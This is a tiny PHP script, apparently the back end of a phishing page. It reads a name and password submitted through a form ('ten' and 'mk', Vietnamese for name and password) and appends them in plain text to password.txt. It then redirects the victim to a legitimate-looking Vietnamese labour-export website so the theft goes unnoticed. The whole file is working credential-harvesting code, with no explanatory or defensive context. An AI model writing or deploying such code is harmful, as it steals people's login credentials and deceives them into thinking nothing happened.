<?php
$ten=$_POST['ten'];
$mk=$_POST['mk'];
$f=fopen("password.txt","a");
fwrite($f,"Ten: $ten - mat khau: $mk \n");
fclose($f);
?>
<script>
	location.href="https://laodongnhatban.com.vn";
</script>
